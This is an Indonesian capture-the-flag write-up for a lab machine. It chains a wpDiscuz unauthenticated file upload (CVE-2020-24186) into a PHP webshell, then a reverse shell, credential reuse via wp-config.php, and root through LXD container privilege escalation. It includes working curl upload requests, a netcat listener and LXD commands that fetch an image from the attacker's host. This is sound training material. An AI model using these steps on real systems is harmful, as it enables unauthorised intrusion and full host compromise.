**Platform:** HackTrace  
**Nama Mesin:** elite  
**IP Target:** 10.1.2.127  
**Tingkat Kesulitan:** Easy  
**Kategori:** Linux, Web, Privilege Escalation  

---

## Ringkasan

Mesin **e-leet** merupakan tantangan bertingkat kesulitan _easy_ yang berfokus pada eksploitasi WordPress. Alur serangan dimulai dari penemuan plugin WordPress yang rentan (**wpDiscuz CVE-2020-24186**), memungkinkan upload file PHP tanpa autentikasi untuk mendapatkan _remote code execution_. Setelah mendapatkan akses awal sebagai `www-data`, ditemukan kredensial di file `wp-config.php` yang digunakan untuk berpindah ke user `miko`. Privilege escalation ke root dicapai melalui penyalahgunaan keanggotaan grup **LXD**.

---

## Reconnaissance

### Port Scanning dengan RustScan

Langkah pertama adalah melakukan pemindaian port untuk menemukan layanan yang berjalan di target.

```bash
rustscan -a 10.1.2.127 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
```

**Hasil:**

```
Open 10.1.2.127:22   →  SSH (OpenSSH)
Open 10.1.2.127:80   →  HTTP (Apache/2.4.41 Ubuntu)
```

Hanya dua port yang terbuka — port **22 (SSH)** dan port **80 (HTTP)**. Fokus awal diarahkan ke layanan web pada port 80.

---

## Enumerasi Web

### Directory Bruteforce dengan Feroxbuster

Dilakukan pemindaian direktori untuk menemukan jalur tersembunyi pada web server.

```bash
feroxbuster -u http://10.1.2.127/ \
  -w /home/greed/SecLists-master/Discovery/Web-Content/directory-list-2.3-small.txt \
  -t 50 --filter-status 404,400 -k --no-recursion --dont-filter --redirects
```

**Hasil:**

```
200  GET  http://10.1.2.127/
200  GET  http://10.1.2.127/wordpress/
```

Ditemukan instalasi **WordPress** berjalan di `/wordpress/`.

---

## Enumerasi WordPress

### WPScan — Deteksi Plugin Rentan

Dilakukan pemindaian mendalam terhadap instalasi WordPress menggunakan WPScan.

```bash
wpscan --url http://10.1.2.127/wordpress/ \
       --plugins-detection aggressive \
       --api-token <API_TOKEN>
```

**Temuan Penting:**

|Item|Detail|
|---|---|
|Versi WordPress|5.5.3 (Insecure)|
|Plugin|Comments – wpDiscuz 7.0.4|
|CVE|CVE-2020-24186|
|Severity|**CRITICAL (CVSS 10.0)**|

**Deskripsi Kerentanan:**  
wpDiscuz versi 7.0.0–7.0.4 memiliki kerentanan _Unauthenticated Arbitrary File Upload_. Plugin ini memungkinkan pengguna melampirkan gambar pada komentar, namun validasi tipe file dapat dilewati dengan menyisipkan _magic bytes_ JPEG di awal file PHP, sehingga penyerang tanpa autentikasi dapat mengupload _webshell_ dan mencapai _Remote Code Execution_.

### Pengumpulan Informasi Tambahan

Dilakukan pengumpulan link dari halaman utama WordPress untuk menemukan post aktif dan username.

```bash
curl -s "http://10.1.2.127/wordpress/" \
     | grep -oP 'href="[^"]+"' \
     | grep -v "wp-content\|wp-includes\|#" \
     | sort -u
```

**Hasil:**

```
href="http://10.1.2.127/wordpress/index.php/2020/11/06/hello-world/"
href="http://10.1.2.127/wordpress/index.php/author/cherryblossomshrinemaiden/"
href="http://10.1.2.127/wordpress/wp-login.php"
href="http://10.1.2.127/wordpress/xmlrpc.php?rsd"
```

Dua informasi penting diperoleh:

- **URL post aktif:** `/index.php/2020/11/06/hello-world/`
- **Username WordPress:** `cherryblossomshrinemaiden`

---

## Eksploitasi

### CVE-2020-24186 — Unauthenticated Arbitrary File Upload

#### Step 1 — Ambil Nonce dari Halaman Post

WordPress menggunakan mekanisme _nonce_ sebagai token keamanan untuk validasi request AJAX. Nonce diambil dari halaman post yang ditemukan sebelumnya.

```bash
curl -s "http://10.1.2.127/wordpress/index.php/2020/11/06/hello-world/" \
     | grep -oP '"wmuSecurity":"\K[^"]+'
```

**Hasil:** `ab575494ea`

#### Step 2 — Buat PHP Webshell dengan JPEG Magic Bytes

File PHP dibuat dengan menyisipkan _magic bytes_ JPEG (`\xff\xd8\xff\xe0`) di awal file untuk melewati validasi MIME type.

```bash
printf '\xff\xd8\xff\xe0<?php (payload cmd) ?>' > shell.php
```

#### Step 3 — Upload Webshell via AJAX

```bash
curl -s -X POST \
  "http://10.1.2.127/wordpress/wp-admin/admin-ajax.php" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Referer: http://10.1.2.127/wordpress/index.php/2020/11/06/hello-world/" \
  -F "action=wmuUploadFiles" \
  -F "wmu_nonce=ab575494ea" \
  -F "wmuAttachmentsData=undefined" \
  -F "wmu_files[0]=@shell.php;type=image/jpeg" \
  -F "postId=26"
```

**Response:**

```json
{
  "success": true,
  "data": {
    "previewsData": {
      "images": [{
        "url": "http://10.1.2.127/wordpress/wp-content/uploads/2026/05/shell-1780076253.1254.php"
      }]
    }
  }
}
```

Upload berhasil! Webshell tersimpan di:

```
http://10.1.2.127/wordpress/wp-content/uploads/2026/05/shell-1780076253.1254.php
```

## Akses Awal

### Remote Code Execution → Reverse Shell

Dengan webshell aktif, dilakukan eksekusi perintah dan upgrade ke _reverse shell_.

bash

```bash
SHELL="http://10.1.2.127/wordpress/wp-content/uploads/2026/05/shell-1780076253.1254.php"

# Listener di mesin lokal
nc -lvnp 4444

# Trigger reverse shell
curl "$SHELL?cmd={payload reverse shell}"
```

Akses shell diperoleh sebagai `www-data`.

### Lateral Movement — www-data ke miko

Ditemukan kredensial database di file `wp-config.php`:

bash

```bash
cat wp-config.php
```
Kredensial yang ditemukan:

```
DB_PASSWORD : UE5b4*k%$dRv%MqHsY^K#
```

Password tersebut digunakan untuk berpindah ke user `miko`:

```bash
su miko
# Password: UE5b4*k%$dRv%MqHsY^K#
```

## Privilege Escalation

### Enumerasi Grup — LXD

Setelah berhasil masuk sebagai `miko`, dilakukan pengecekan informasi user:

```bash
id
```

```
uid=1000(miko) gid=1000(miko) groups=1000(miko),4(adm),24(cdrom),27(sudo),
30(dip),46(plugdev),116(lxd)
```

User `miko` tergabung dalam grup **`lxd`**  ini merupakan vektor privilege escalation yang kritis. Anggota grup `lxd` dapat membuat _privileged container_ dan me-mount seluruh filesystem host ke dalamnya, memberikan akses root penuh.

### LXD Privilege Escalation

#### Di Mesin Lokal — Build Alpine Image

```bash
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo bash build-alpine

# Hasilkan file: alpine-v3.13-x86_64-20210218_0139.tar.gz
python3 -m http.server 8080
```

#### Di Mesin Target — Eksekusi


```bash
# Download alpine image
wget http://10.18.200.142:8080/alpine-v3.13-x86_64-20210218_0139.tar.gz

# Import sebagai LXC image
lxc image import ~/alpine-v3.13-x86_64-20210218_0139.tar.gz --alias pwn

# Inisialisasi LXD
lxd init --auto

# Buat privileged container
lxc init pwn pwned -c security.privileged=true

# Mount seluruh filesystem host ke /mnt/root di dalam container
lxc config device add pwned host-root disk source=/ path=/mnt/root recursive=true

# Start container dan masuk
lxc start pwned
lxc exec pwned -- /bin/sh
```

**Konfirmasi root:**

```bash
whoami
# root
id
# uid=0(root) gid=0(root)
```

---

## Pengambilan Flag

Dari dalam container, seluruh filesystem host dapat diakses melalui `/mnt/root`:

```bash
# User flag
cat /mnt/root/home/miko/user.txt

# Root flag
cat /mnt/root/root/root.txt
```

---

